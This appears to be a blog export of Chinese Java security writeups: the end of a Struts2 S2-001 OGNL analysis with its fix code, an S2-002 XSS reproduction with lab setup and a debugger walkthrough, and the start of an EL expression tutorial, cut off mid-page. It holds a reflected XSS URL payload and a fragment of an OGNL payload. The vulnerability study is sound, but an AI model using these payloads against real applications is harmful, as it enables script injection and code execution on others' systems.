java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()&#125;\n\n\n\n0x03 漏洞修复通过之前的漏洞分析可以看到，由于 struts2 错误的使用了递归来进行验证，导致OGNL表达式的执行\n官方给出的修复\npublic static Object translateVariables(char open, String expression, ValueStack stack, Class asType, ParsedValueEvaluator evaluator, int maxLoopCount) &#123;\n    // deal with the \"pure\" expressions first!\n    //expression = expression.trim();\n    Object result = expression;\n    int loopCount = 1;\n    int pos = 0;\n    while (true) &#123;\n\n        int start = expression.indexOf(open + \"&#123;\", pos);\n        if (start == -1) &#123;\n            pos = 0;\n            loopCount++;\n            start = expression.indexOf(open + \"&#123;\");\n        &#125;\n        if (loopCount > maxLoopCount) &#123;\n            // translateVariables prevent infinite loop / expression recursive evaluation\n            break;\n        &#125;\n        int length = expression.length();\n        int x = start + 2;\n        int end;\n        char c;\n        int count = 1;\n        while (start != -1 &amp;&amp; x &lt; length &amp;&amp; count != 0) &#123;\n            c = expression.charAt(x++);\n            if (c == '&#123;') &#123;\n                count++;\n            &#125; else if (c == '&#125;') &#123;\n                count--;\n            &#125;\n        &#125;\n        end = x - 1;\n\n        if ((start != -1) &amp;&amp; (end != -1) &amp;&amp; (count == 0)) &#123;\n            String var = expression.substring(start + 2, end);\n\n            Object o = stack.findValue(var, asType);\n            if (evaluator != null) &#123;\n                o = evaluator.evaluate(o);\n            &#125;\n\n            String left = expression.substring(0, start);\n            String right = expression.substring(end + 1);\n            String middle = null;\n            if (o != null) &#123;\n                middle = o.toString();\n                if (!TextUtils.stringSet(left)) &#123;\n                    result = o;\n                &#125; else &#123;\n                    result = left + middle;\n                &#125;\n\n                if (TextUtils.stringSet(right)) &#123;\n                    result = result + right;\n                &#125;\n\n                expression = left + middle + right;\n            &#125; else &#123;\n                // the variable doesn't exist, so don't display anything\n                result = left + right;\n                expression = left + right;\n            &#125;\n            pos = (left != null &amp;&amp; left.length() > 0 ? left.length() - 1: 0) +\n                  (middle != null &amp;&amp; middle.length() > 0 ? middle.length() - 1: 0) +\n                  1;\n            pos = Math.max(pos, 1);\n        &#125; else &#123;\n            break;\n        &#125;\n    &#125;\n\n    return XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);\n&#125;\n\n\n可以明显看到多了这样的判断\nif (loopCount > maxLoopCount) &#123;\n    // translateVariables prevent infinite loop / expression recursive evaluation\n    break;\n&#125;\n\n判断了循环的次数，从而在解析到 %&#123;1+1&#125; 的时候不会继续向下递归\n0x04 总结本质上还是去寻找如何执行 OGNL 表达式的。\n0x05 Refhttps://xz.aliyun.com/t/2672https://www.cnblogs.com/yanghyun/p/4472374.htmlhttps://github.com/Y4tacker/JavaSec/blob/main/7.Struts2%E4%B8%93%E5%8C%BA/s2-001%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/Struts2-001.md\n","categories":["Java"],"tags":["漏洞复现","Java"]},{"title":"Java Struts2 系列 S2-002","url":"/2023/03/07/Java-Struts2-%E7%B3%BB%E5%88%97-S2-002/","content":"S2-002\n\n0x01 前言复现一下 S2-002 的洞\n0x02 S2-002漏洞简介Struts2-002 是一个 XSS 漏洞，该漏洞发生在 s:url 和 s:a 标签中，当标签的属性 includeParams=all 时，即可触发该漏洞。\n漏洞影响版本Struts 2.0.0 - Struts 2.1.8.1\n0x03 环境搭建\n如果不想手动搭建的话，环境我已经配好了 https://github.com/Drun1baby/JavaSecurityLearning/tree/main/JavaSecurity/Struts2/S2-002AndS2-006\n\n因为 s2-002 的洞是一个 XSS，与处理的 Action 没有任何关系，所以这里我们只需要配置 .jsp 文件，以及 .xml 文件\n\nresources 文件夹下\n\nstruts.xml\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>  \n  \n&lt;!DOCTYPE struts PUBLIC  \n        \"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN\"  \n        \"http://struts.apache.org/dtds/struts-2.0.dtd\">  \n  \n&lt;struts>  \n    &lt;package name=\"S2-002\" extends=\"struts-default\">  \n        &lt;action name=\"login\" class=\"com.drunkbaby.action.LoginAction\" method=\"execute\">  \n            &lt;result name=\"success\">welcome.jsp&lt;/result>  \n            &lt;result name=\"error\">index.jsp&lt;/result>  \n        &lt;/action>  \n    &lt;/package>  \n&lt;/struts>\n\n\nwebapp 文件夹下\n\nindex.jsp\n&lt;%@ page language&#x3D;&quot;java&quot; contentType&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;  \n         pageEncoding&#x3D;&quot;UTF-8&quot;%&gt;  \n&lt;%@ taglib prefix&#x3D;&quot;s&quot; uri&#x3D;&quot;&#x2F;struts-tags&quot; %&gt;  \n  \n&lt;html&gt;  \n&lt;head&gt;  \n    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;  \n    &lt;title&gt;S2-002&lt;&#x2F;title&gt;  \n&lt;&#x2F;head&gt;  \n&lt;body&gt;  \n&lt;h2&gt;S2-002 Demo&lt;&#x2F;h2&gt;  \n&lt;s:url action&#x3D;&quot;login&quot; includeParams&#x3D;&quot;all&quot;&gt;&lt;&#x2F;s:url&gt;  \n&lt;s:a href&#x3D;&quot;%&#123;url&#125;&quot;&gt;click&lt;&#x2F;s:a&gt;  \n&lt;&#x2F;body&gt;  \n&lt;&#x2F;html&gt;\n\nwelcome.jsp\n&lt;%@ page language&#x3D;&quot;java&quot; contentType&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;  \n         pageEncoding&#x3D;&quot;UTF-8&quot;%&gt;  \n&lt;%@ taglib prefix&#x3D;&quot;s&quot; uri&#x3D;&quot;&#x2F;struts-tags&quot; %&gt;  \n  \n&lt;html&gt;  \n&lt;head&gt;  \n  &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;  \n  &lt;title&gt;S2-002&lt;&#x2F;title&gt;  \n&lt;&#x2F;head&gt;  \n&lt;body&gt;  \n&lt;p&gt;Hello &lt;s:property value&#x3D;&quot;username&quot;&gt;&lt;&#x2F;s:property&gt;&lt;&#x2F;p&gt;  \n&lt;&#x2F;body&gt;  \n&lt;&#x2F;html&gt;\n\n接着在 WEB-INF 下，web.xml\n&lt;!DOCTYPE web-app PUBLIC  \n \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\"  \n \"http://java.sun.com/dtd/web-app_2_3.dtd\" >  \n  \n&lt;web-app>  \n  &lt;display-name>S2-002 Example&lt;/display-name>  \n  &lt;filter>  \n    &lt;filter-name>struts2&lt;/filter-name>  \n    &lt;filter-class>org.apache.struts2.dispatcher.FilterDispatcher&lt;/filter-class>  \n  &lt;/filter>  \n  &lt;filter-mapping>  \n    &lt;filter-name>struts2&lt;/filter-name>  \n    &lt;url-pattern>/*&lt;/url-pattern>  \n  &lt;/filter-mapping>  \n  &lt;welcome-file-list>  \n    &lt;welcome-file>index.jsp&lt;/welcome-file>  \n  &lt;/welcome-file-list>  \n&lt;/web-app>\n\n项目结构如图，至此环境搭建完毕\n\n\n0x04 漏洞复现与分析http:&#x2F;&#x2F;localhost:8080&#x2F;?%22%3E%3Cscript%3Ealert(1)%3C&#x2F;script%3E%3C%22\n\n\n\n漏洞分析\n之前自己也没有分析过 XSS 相关的漏洞，在最后我会做一个小结来思考一下如何自己挖掘出这个漏洞\n\n我们先下一个断点在 org.apache.struts2.views.jsp.ComponentTagSupport#doStartTag() 方法处，开始调试\n\n\n当在 JSP 文件中遇到 Struts2 标签 &lt;s: 时，程序会先调用 doStartTag() 方法 ，并将标签中的属性设置到对应标签对象相应属性中。最后，在遇到 /&gt; 结束标签的时候调用 doEndTag() 方法。\n进入到了 index.jsp\n\n\n跟进 this.component.start()\n\n\n在 index.jsp 中 includeParams=all，往下看代码知道 88 行，跟进 mergeRequestParameters() 方法\n在 includeParams=all 的情况下会调用 mergeRequestParameters() 将 Tomcat 处取来的参数，这里取到了我们输入的 payload，并且保存在 this.parameters 中\n\n\nmergeRequestParameters() 方法运行完毕，往下是 includeGetParameters() 方法，也跟进去看一下；发现也是调用了 mergeRequestParameters()，同样是保存在了 this.parameters 中，不过这一次保存的是经过 url 编码的数据\n\n\n继续往下，程序还调用了 includeExtraParameters() 方法，跟进；这里的意思是如果有额外的参数，会被保存进这里，然后再保存到 this.paramters\n\n\n其实到这里漏洞出发点就来了，第一次调用 mergeRequestParameters() 方法的时候那一段参数是未经过 URL 编码的，从而产生了 XSS\n在执行完毕 doStartTag() 方法之后，会去到 doEndTag() 方法，我们跟进 this.component.end()，this.component 是 URL 类，所以也就是调用了 URL.end()\n\n\n往下走，第 146 行，判断目前调度器（Dispatcher）的实例是否支持这一 Struts2 组件的行为，并且判断这一个请求是否需要 Struts2 组件调用某 Action 来处理；如果不需要调用 Action 处理，则直接进入 buildUrl() 的代码逻辑，如果需要 Action 来处理，会先去选择&#x2F;调用 Action，再进行后续操作。\n其实也就是 Struts2 运行的基本逻辑\n\n\n此处因为我们定义了 action=login，所以进入到了 else 的代码逻辑，跟进 this.determineActionURL() 方法\n\n\ndetermineActionURL() 方法先定位到了对应的 action，再进行 buildUrl() 的操作，跟进 buildUrl()\n\n\n再跟进\n\n\n此时的 params 即将会被拿去拼接，造成触发 XSS 漏洞\n\n\n具体拼接是在 115 行的 buildParametersString() 方法，跟进再跟进\n\n\n\n至此，漏洞分析结束\n\n漏洞修复修改 pom.xml，将 Struts2 版本提升至 2.0.11（这是根据公告的，其实并没有真正解决漏洞）\n经过对 2.0.11.1 的代码阅读，在 UrlHelper 类 buildUrl() 方法里，第 136 行增加了如下修复代码:\n// link是最终的生成的url\n       for(result = link.toString(); \n       result.indexOf(\"&lt;script>\") > 0; \n       result = result.replaceAll(\"&lt;script>\", \"script\")) &#123;\n       &#125;\n\n太鸡肋，基本算不上修复。。。\n0x05 小结因为是 XSS 漏洞，成因基本都是未进行 URL 编码或某种转码，所以我们可以去看处理参数的过程进行漏洞挖掘。\nS2-002 还是比较简单的一个漏洞。\n0x06 Refhttps://github.com/Y4tacker/JavaSec/tree/main/7.Struts2%E4%B8%93%E5%8C%BA/S2-002%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90\n","categories":["Java"],"tags":["漏洞复现","Java"]},{"title":"Java 之 EL 表达式注入","url":"/2022/09/23/Java-%E4%B9%8B-EL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/","content":"EL 表达式注入\n\nJava 之 EL 表达式注入0x01 前言最近又回来刷基础啦！\n0x02 EL 表达式的前世今生\n要简单了解一下 EL 表达式的背景，有助于我们更好的学习。\n\n师傅们在学习 JSP 的时候，一定有过这样的问题：\n感觉 JSP 代码的可读性非常差\n感觉 JSP 的代码很难写\n比如我们看一个 JSP 的 demo\nJSP Demo\nTarget —&gt;\n\n\n\n如果作为静态页面出现的话，应该是这样的\n&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n \n&lt;%\n    // 查询数据库\n    List&lt;Brand> brands = new ArrayList&lt;Brand>();\n    brands.add(new Brand(1,\"三只松鼠\",\"三只松鼠\",100,\"三只松鼠，好吃不上火\",1));\n    brands.add(new Brand(2,\"优衣库\",\"优衣库\",200,\"优衣库，服适人生\",0));\n    brands.add(new Brand(3,\"小米\",\"小米科技有限公司\",1000,\"为发烧而生\",1));\n \n%>\n&lt;!DOCTYPE html>\n&lt;html lang=\"en\">\n&lt;head>\n    &lt;meta charset=\"UTF-8\">\n    &lt;title>Title&lt;/title>\n&lt;/head>\n&lt;body>\n&lt;input type=\"button\" value=\"新增\">&lt;br>\n&lt;hr>\n&lt;table border=\"1\" cellspacing=\"0\" width=\"800\">\n    &lt;tr>\n        &lt;th>序号&lt;/th>\n        &lt;th>品牌名称&lt;/th>\n        &lt;th>企业名称&lt;/th>\n        &lt;th>排序&lt;/th>\n        &lt;th>品牌介绍&lt;/th>\n        &lt;th>状态&lt;/th>\n        &lt;th>操作&lt;/th>\n \n    &lt;/tr>\n    &lt;tr align=\"center\">\n        &lt;td>1&lt;/td>\n        &lt;td>三只松鼠&lt;/td>\n        &lt;td>三只松鼠&lt;/td>\n        &lt;td>100&lt;/td>\n        &lt;td>三只松鼠，好吃不上火&lt;/td>\n        &lt;td>启用&lt;/td>\n        &lt;td>&lt;a href=\"#\">修改&lt;/a> &lt;a href=\"#\">删除&lt;/a>&lt;/td>\n    &lt;/tr>\n \n    &lt;tr align=\"center\">\n        &lt;td>2&lt;/td>\n        &lt;td>优衣库&lt;/td>\n        &lt;td>优衣库&lt;/td>\n        &lt;td>10&lt;/td>\n        &lt;td>优衣库，服适人生&lt;/td>\n        &lt;td>禁用&lt;/td>\n \n        &lt;td>&lt;a href=\"#\">修改&lt;/a> &lt;a href=\"#\">删除&lt;/a>&lt;/td>\n    &lt;/tr>\n \n    &lt;tr align=\"center\">\n        &lt;td>3&lt;/td>\n        &lt;td>小米&lt;/td>\n        &lt;td>小米科技有限公司&lt;/td>\n        &lt;td>1000&lt;/td>\n        &lt;td>为发烧而生&lt;/td>\n        &lt;td>启用&lt;/td>\n \n        &lt;td>&lt;a href=\"#\">修改&lt;/a> &lt;a href=\"#\">删除&lt;/a>&lt;/td>\n    &lt;/tr>\n \n \n&lt;/table>\n \n&lt;/body>\n&lt;/html>\n\n但是现在我们要实现动态性，也就是通过循环遍历的方式，获取到数据库里面的数据（当然这里做的没有这么复杂）\n先写一个实体类\nBrand.java\npackage com.drunkbaby.basicjsp.pojo;\n\n/**\n * 品牌实体类\n */\n\npublic class Brand &#123;\n\n    private Integer id;\n    private String brandName;\n    private String companyName;\n    private Integer ordered;\n    private String description;\n    private Integer status;\n\n\n    public Brand() &#123;\n    &#125;\n\n    public Brand(Integer id, String brandName, String companyName, String description) &#123;\n        this.id = id;\n        this.brandName = brandName;\n        this.companyName = companyName;\n        this.description = description;\n    &#125;\n\n    public Brand(Integer id, String brandName, String companyName, Integer ordered, String description, Integer status) &#123;\n        this.id = id;\n        this.brandName = brandName;\n        this.companyName = companyName;\n        this.ordered = ordered;\n        this.description = description;\n        this.status = status;\n    &#125;\n\n    public Integer getId() &#123;\n        return id;\n    &#125;\n\n    public void setId(Integer id) &#123;\n        this.id = id;\n    &#125;\n\n    public String getBrandName() &#123;\n        return brandName;\n    &#125;\n\n    public void setBrandName(String brandName) &#123;\n        this.brandName = brandName;\n    &#125;\n\n    public String getCompanyName() &#123;\n        return companyName;\n    &#125;\n\n    public void setCompanyName(String companyName) &#123;\n        this.companyName = companyName;\n    &#125;\n\n    public Integer getOrdered() &#123;\n        return ordered;\n    &#125;\n\n    public void setOrdered(Integer ordered) &#123;\n        this.ordered = ordered;\n    &#125;\n\n    public String getDescription() &#123;\n        return description;\n    &#125;\n\n    public void setDescription(String description) &#123;\n        this.description = description;\n    &#125;\n\n    public Integer getStatus() &#123;\n        return status;\n    &#125;\n\n    public void setStatus(Integer status) &#123;\n        this.status = status;\n    &#125;\n\n    @Override\n    public String toString() &#123;\n        return \"Brand&#123;\" +\n                \"id=\" + id +\n                \", brandName='\" + brandName + '\\'' +\n                \", companyName='\" + companyName + '\\'' +\n                \", ordered=\" + ordered +\n                \", description='\" + description + '\\'' +\n                \", status=\" + status +\n                '&#125;';\n    &#125;\n&#125;\n\n接着，来实现动态的 JSP 代码\n&lt;%@ page import=\"com.drunkbaby.basicjsp.pojo.Brand\" %>  \n&lt;%@ page import=\"java.util.List\" %>  \n&lt;%@ page import=\"java.util.ArrayList\" %>  \n&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>  \n   \n&lt;%  \n    // 查询数据库  \n    List&lt;Brand> brands = new ArrayList&lt;Brand>();  \n    brands.add(new Brand(1,\"三只松鼠\",\"三只松鼠\",100,\"三只松鼠，好吃不上火\",1));  \n    brands.add(new Brand(2,\"优衣库\",\"优衣库\",200,\"优衣库，服适人生\",0));  \n    brands.add(new Brand(3,\"小米\",\"小米科技有限公司\",1000,\"为发烧而生\",1));  \n   \n%>  \n   \n   \n&lt;!DOCTYPE html>  \n&lt;html lang=\"en\">  \n&lt;head>  \n &lt;meta charset=\"UTF-8\">  \n &lt;title>Title&lt;/title>  \n&lt;/head>  \n&lt;body>  \n&lt;input type=\"button\" value=\"新增\">&lt;br>  \n&lt;hr>  \n&lt;table border=\"1\" cellspacing=\"0\" width=\"800\">  \n &lt;tr>  \n &lt;th>序号&lt;/th>  \n &lt;th>品牌名称&lt;/th>  \n &lt;th>企业名称&lt;/th>  \n &lt;th>排序&lt;/th>  \n &lt;th>品牌介绍&lt;/th>  \n &lt;th>状态&lt;/th>  \n &lt;th>操作&lt;/th>  \n &lt;/tr>  \n &lt;%  \n        for (int i = 0; i &lt; brands.size(); i++) &#123;  \n            Brand brand = brands.get(i);  \n    %>  \n    &lt;tr align=\"center\">  \n &lt;td>&lt;%=brand.getId()%>&lt;/td>  \n &lt;td>&lt;%=brand.getBrandName()%>&lt;/td>  \n &lt;td>&lt;%=brand.getCompanyName()%>&lt;/td>  \n &lt;td>&lt;%=brand.getOrdered()%>&lt;/td>  \n &lt;td>&lt;%=brand.getDescription()%>&lt;/td>  \n &lt;td>&lt;%=brand.getStatus() == 1 ? \"启用\":\"禁用\"%>&lt;/td>  \n &lt;td>&lt;a href=\"#\">修改&lt;/a> &lt;a href=\"#\">删除&lt;/a>&lt;/td>  \n &lt;/tr>  \n &lt;%  \n        &#125;  \n    %>  \n&lt;/table>  \n&lt;/body>  \n&lt;/html>\n\n成功！\n\n\nJSP 缺点通过上面的案例，我们可以看到 JSP 的很多缺点。\n由于 JSP页面内，既可以定义 HTML 标签，又可以定义 Java代码，造成了以下问题：\n难写难读难维护。\n书写麻烦：特别是复杂的页面\n既要写 HTML 标签，还要写 Java 代码\n阅读麻烦\n上面案例的代码，相信你后期再看这段代码时还需要花费很长的时间去梳理\n复杂度高：运行需要依赖于各种环境，JRE，JSP 容器，JavaEE…\n占内存和磁盘：JSP 会自动生成 .java 和 .class 文件占磁盘，运行的是 .class 文件占内存\n调试困难：出错后，需要找到自动生成的.java文件进行调试\n不利于团队协作：前端人员不会 Java，后端人员不精 HTML\n如果页面布局发生变化，前端工程师对静态页面进行修改，然后再交给后端工程师，由后端工程师再将该页面改为 JSP 页面\n由于上述的问题， JSP 已逐渐退出历史舞台，以后开发更多的是使用 HTML + Ajax 来替代。Ajax 是异步的 JavaScript。有个这个技术后，前端工程师负责前端页面开发，而后端工程师只负责前端代码开发。\n\n\n但是有时候又不得不使用 JSP 进行开发，这时候就要隆重介绍我们今天的主角了 —————— EL 表达式\n0x03 EL 表达式的基础语法概述EL（全称 Expression Language ）表达式语言。\n作用：\n\n1.用于简化 JSP 页面内的 Java 代码。\n\n2.主要作用是 获取数据。其实就是从域对象中获取数据，然后将数据展示在页面上。\n\n\n用法：\n要先通过 page 标签设置不忽略 EI 表达式\n&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" isELIgnored=\"false\" %>\n\n语法：\n$&#123;expression&#125;\n在 JSP 中我们可以如下写：\n$&#123;brans&#125;，这到底是啥意思呢？比较玄，但是却是一个很有趣，并且很合理的机制。\n$&#123;brans&#125; 是获取域中存储的 key 作为 brands 的数据。\n而 JSP 当中有四大域，它们分别是：\n\npage：当前页面有\nrequest：当前请求有效\nsession：当前会话有效\napplication：当前应用有效\n\nel 表达式获取数据，会依次从这 4 个域中寻找，直到找到为止。而这四个域对象的作用范围如下图所示。\n\n\n例如： $&#123;brands&#125;，el 表达式获取数据，会先从 page 域对象中获取数据，如果没有再到 requet 域对象中获取数据，如果再没有再到 session 域对象中获取，如果还没有才会到 application 中获取数据。\n其实是有那么一点双亲委派的味道在里面的。\nEL 表达式 Demo要使用 EL 表达式来获取数据，需要按照顺序完成以下几个步骤。\n\n获取到数据，比如从数据库中拿到数据\n将数据存储到 request 域中\n转发到对应的 jsp 文件中\n\n先定义一个 Servlet\n@WebServlet(\"/demo1\")\npublic class ServletDemo1 extends HttpServlet &#123;\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;\n        //1. 准备数据\n        List&lt;Brand> brands = new ArrayList&lt;Brand>();\n        brands.add(new Brand(1,\"三只松鼠\",\"三只松鼠\",100,\"三只松鼠，好吃不上火\",1));\n        brands.add(new Brand(2,\"优衣库\",\"优衣库\",200,\"优衣库，服适人生\",0));\n        brands.add(new Brand(3,\"小米\",\"小米科技有限公司\",1000,\"为发烧而生\",1));\n \n        //2. 存储到request域中\n        request.setAttribute(\"brands\",brands);\n \n        //3. 转发到 el-demo.jsp\n        request.getRequestDispatcher(\"/el-demo.jsp\").forward(request,response);\n    &#125;\n \n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123;\n        this.doGet(request, response);\n    &#125;\n&#125;\n\n\n顺便提一嘴转发的作用：通过转发，我们才可以使用 request 对象作为域对象进行数据共享\n\n\n在 el-demo.jsp 中通过 EL表达式 获取数据\n\n访问 /demo1 接口，是可以成功读到数据的。\n\n\n这里的 Demo 其实是 EL 表达式的一小部分，$&#123;expression&#125; 是 EL 表达式的变量\n运算符存取数据的运算符EL表达式提供 . 和 [] 两种运算符来存取数据。\n当要存取的属性名称中包含一些特殊字符，如 . 或 - 等并非字母或数字的符号，就一定要使用 []。例如：$&#123;user.My-Name&#125; 应当改为 $&#123;user[&quot;My-Name&quot;]&#125;。\n如果要动态取值时，就可以用 [] 来做，而 . 无法做到动态取值。例如：$&#123;sessionScope.user[data]&#125; 中data 是一个变量。\nempty 运算符empty 用来判断 EL 表达式中的对象或者变量是否为空。若为空或者 null，返回 true，否则返回 false。\n条件表达式EL 表达式中，条件运算符的语法和 Java 的完全一致，如下：\n$&#123;条件表达式?表达式1:表达式2&#125;\n\n写一个运算符相关的 demo\noperator.jsp\n&lt;%@ page import=\"com.drunkbaby.basicjsp.pojo.Site\" %>\n&lt;%@ page import=\"java.util.ArrayList\" %>\n&lt;%@ page import=\"java.util.List\" %>\n&lt;%@ page import=\"java.util.HashMap\" %>\n&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n&lt;html>\n  &lt;head>\n    &lt;title>JSP 运算符&lt;/title>\n  &lt;/head>\n  &lt;body>\n  &lt;h3>.运算符&lt;/h3>\n\n  &lt;%\n          Site site = new Site();\n          site.setName(\"Drunkbaby's Home\");\n          site.setUrl(\"drunkbaby.github.io\");\n          session.setAttribute(\"site\", site);\n      %>\n      欢迎来到$&#123;site.name&#125;，博客网址是：$&#123;site.url&#125;\n\n      &lt;h3>[]运算符&lt;/h3>\n  &lt;%\n          List tutorials = new ArrayList();\n          tutorials.add(\"Java\");\n          tutorials.add(\"Python\");\n          session.setAttribute(\"tutorials\", tutorials);\n          HashMap siteMap = new HashMap();\n          siteMap.put(\"one\", \"Drunkbaby\");\n          siteMap.put(\"two\", \"silly baby\");\n          session.setAttribute(\"site\", siteMap);\n  %>\n      tutorials 中的内容：$&#123;tutorials[0]&#125;，$&#123;tutorials[1]&#125;\n      &lt;br> siteMap 中的内容：$&#123;site.one&#125;，$&#123;site.two&#125;\n\n       &lt;h3>empty和条件运算符&lt;/h3>\n    &lt;!-- 当 cart 变量为空时，输出购物车为空，否则输出cart -->\n    &lt;%\n        String cart = null;\n    %>\n    $&#123;empty cart?\"购物车为空\":cart&#125;\n\n  &lt;/body>\n&lt;/html>\n\n输出如图\n\n\n变量EL 表达式存取变量数据的方法很简单，例如：$&#123;username&#125;。它的意思是取出某一范围中名称为 username 的变量。因为我们并没有指定哪一个范围的 username，所以它会依序从 Page、Request、Session、Application 范围查找。假如途中找到 username，就直接回传，不再继续找下去，但是假如全部的范围都没有找到时，就回传 &quot;&quot;。\n这就和我们上面讲的 demo 是一样的\nEL表达式的属性如下：\n\n\n四大域\n域在EL中的名称\n\n\n\n\nPage\nPageScope\n\n\nRequest\nRequestScope\n\n\nSession\nSessionScope\n\n\nApplication\nApplicationScope\n\n\n\n\nJSP 表达式语言定义可在表达式中使用的以下文字：\n\n\n文字\n文字的值\n\n\n\n\nBoolean\ntrue 和 false\n\n\nInteger\n与 Java 类似。可以包含任何整数，例如 24、-45、567\n\n\nFloating Point\n与 Java 类似。可以包含任何正的或负的浮点数，例如 -1.8E-45、4.567\n\n\nString\n任何由单引号或双引号限定的字符串。对于单引号、双引号和反斜杠，使用反斜杠字符作为转义序列。必须注意，如果在字符串两端使用双引号，则单引号不需要转义。\n\n\nNull\nnull\n\n\n\n\n操作符JSP 表达式语言提供以下操作符，其中大部分是 Java 中常用的操作符：\n\n\n术语\n定义\n\n\n\n\n算术型\n+、-（二元）、*、/、div、%、mod、-（一元）\n\n\n逻辑型\nand、&amp;&amp;、or、双管道符、!、not\n\n\n关系型\n==、eq、!=、ne、&lt;、lt、&gt;、gt、&lt;=、le、&gt;=、ge。可以与其他值进行比较，或与布尔型、字符串型、整型或浮点型文字进行比较。\n\n\n空\nempty 空操作符是前缀操作，可用于确定值是否为空。\n\n\n条件型\nA ?B :C。根据 A 赋值的结果来赋值 B 或 C。\n\n\n\n\n隐式对象JSP 表达式语言定义了一组隐式对象，其中许多对象在 JSP scriplet 和表达式中可用：\n\n\n术语\n定义\n\n\n\n\npageContext\nJSP页的上下文，可以用于访问 JSP 隐式对象，如请求、响应、会话、输出、servletContext 等。例如，$&#123;pageContext.response&#125;为页面的响应对象赋值。\n\n\n\n\n此外，还提供几个隐式对象，允许对以下对象进行简易访问：\n\n\n术语\n定义\n\n\n\n\nparam\n将请求参数名称映射到单个字符串参数值（通过调用 ServletRequest.getParameter (String name) 获得）。getParameter (String) 方法返回带有特定名称的参数。表达式$&#123;param . name&#125;相当于 request.getParameter (name)。\n\n\nparamValues\n将请求参数名称映射到一个数值数组（通过调用 ServletRequest.getParameter (String name) 获得）。它与 param 隐式对象非常类似，但它检索一个字符串数组而不是单个值。表达式 $&#123;paramvalues. name&#125; 相当于 request.getParamterValues(name)。\n\n\nheader\n将请求头名称映射到单个字符串头值（通过调用 ServletRequest.getHeader(String name) 获得）。表达式 $&#123;header. name&#125; 相当于 request.getHeader(name)。\n\n\nheaderValues\n将请求头名称映射到一个数值数组（通过调用 ServletRequest.getHeaders(String) 获得）。它与头隐式对象非常类似。表达式$&#123;headerValues. name&#125;相当于 request.getHeaderValues(name)。\n\n\ncookie\n将 cookie 名称映射到单个 cookie 对象。向服务器发出的客户端请求可以获得一个或多个 cookie。表达式$&#123;cookie. name .value&#125;返回带有特定名称的第一个 cookie 值。如果请求包含多个同名的 cookie，则应该使用$&#123;headerValues. name&#125;表达式。\n\n\ninitParam\n将上下文初始化参数名称映射到单个值（通过调用 ServletContext.getInitparameter(String name) 获得）。\n\n\n\n\n除了上述两种类型的隐式对象之外，还有些对象允许访问多种范围的变量，如 Web 上下文、会话、请求、页面：\n\n\n术语\n定义\n\n\n\n\npageScope\n将页面范围的变量名称映射到其值。例如，EL 表达式可以使用$&#123;pageScope.objectName&#125;访问一个 JSP 中页面范围的对象，还可以使用$&#123;pageScope .objectName. attributeName&#125;访问对象的属性。\n\n\nrequestScope\n将请求范围的变量名称映射到其值。该对象允许访问请求对象的属性。例如，EL 表达式可以使用$&#123;requestScope. objectName&#125;访问一个 JSP 请求范围的对象，还可以使用$&#123;requestScope. objectName. attributeName&#125;访问对象的属性。\n\n\nsessionScope\n将会话范围的变量名称映射到其值。该对象允许访问会话对象的属性。例如：$&#123;sessionScope. name&#125;\n\n\napplicationScope\n将应用程序范围的变量名称映射到其值。该隐式对象允许访问应用程序范围的对象。\n\n\n\n\npageContext 对象pageContext 对象是 JSP 中 pageContext 对象的引用。通过 pageContext 对象，您可以访问 request 对象。比如，访问 request 对象传入的查询字符串，就像这样：\n$&#123;pageContext.request.queryString&#125;\n\n\n\nScope 对象pageScope，requestScope，sessionScope，applicationScope 变量用来访问存储在各个作用域层次的变量。\n举例来说，如果您需要显式访问在 applicationScope 层的 box 变量，可以这样来访问：\napplicationScope.box\n\nobject.jsp\n\n&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %>\n&lt;html>\n  &lt;head>\n    &lt;title>JSP 对象&lt;/title>\n  &lt;/head>\n  &lt;body>\n  &lt;h3>pageContext 对象&lt;/h3>\n\n        $&#123;pageContext.request.queryString&#125;\n\n        &lt;br/>\n\n        &lt;h3>Scope 对象&lt;/h3>\n\n        &lt;%\n            pageContext.setAttribute(\"name\",\"Drunkbaby_page\");\n            request.setAttribute(\"name\",\"Drunkbaby_page\");\n            session.setAttribute(\"user\",\"Drunkbaby_session\");\n            application.setAttribute(\"user\",\"Drunkbaby_application\");\n        %>\n\n        pageScope.name:$&#123;pageScope.name&#125;\n        &lt;/br>\n        requestScope.name : $&#123;requestScope.name&#125;\n        &lt;/br>\n        sessionScope.user : $&#123;sessionScope.user&#125;\n        &lt;/br>\n        applicationScope.user : $&#123;applicationScope.user&#125;\n  &lt;/body>\n&lt;/html>\n\n\n\nparam 和 paramValues 对象param 和 paramValues 对象用来访问参数值，通过使用 request.getParameter 方法和 request.getParameterValues 方法。\n举例来说，访问一个名为order的参数，可以这样使用表达式：\n$&#123;param.order&#125;，或者$&#123;param[\"order\"]&#125;。\n\n接下来的例子表明了如何访问 request 中的 username 参数：\n&lt;%@ page import=\"java.io.*,java.util.*\" %>\n&lt;%\n    String title = \"Accessing Request Param\";\n%>\n&lt;html>\n&lt;head>\n&lt;title>&lt;% out.print(title); %>&lt;/title>\n&lt;/head>\n&lt;body>\n&lt;center>\n&lt;h1>&lt;% out.print(title); %>&lt;/h1>\n&lt;/center>\n&lt;div 